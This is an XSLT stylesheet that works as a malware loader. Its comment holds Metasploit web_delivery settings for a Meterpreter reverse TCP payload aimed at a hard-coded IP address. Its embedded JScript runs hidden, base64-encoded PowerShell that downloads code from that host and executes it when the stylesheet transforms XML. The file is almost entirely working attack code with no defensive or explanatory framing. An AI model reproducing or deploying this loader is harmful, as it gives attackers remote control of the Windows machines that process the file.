<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">
<!--
#msf
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set lhost 103.238.225.129
set lport 8889
set uripath xslt
exploit
#base64
-->
 <msxsl:script language="JScript" implements-prefix="user">
<![CDATA[
  
      function meter(){
        var rat = "JABEAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAEQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABEAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAkAEQALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADMALgAyADMAOAAuADIAMgA1AC4AMQAyADkAOgA4ADAAOAAwAC8AeABzAGwAdAAnACkAOwA="
        var ps  = "cmd.exe /c powershell -window hidden -enc "
        new ActiveXObject("WScript.Shell").Run(ps + rat,0,true);
      }
      
  
    ]]>
      </msxsl:script>

  <xsl:template match="data">
    <result>
      <xsl:value-of select="user:meter()" />
    </result>
  </xsl:template>
</xsl:stylesheet>
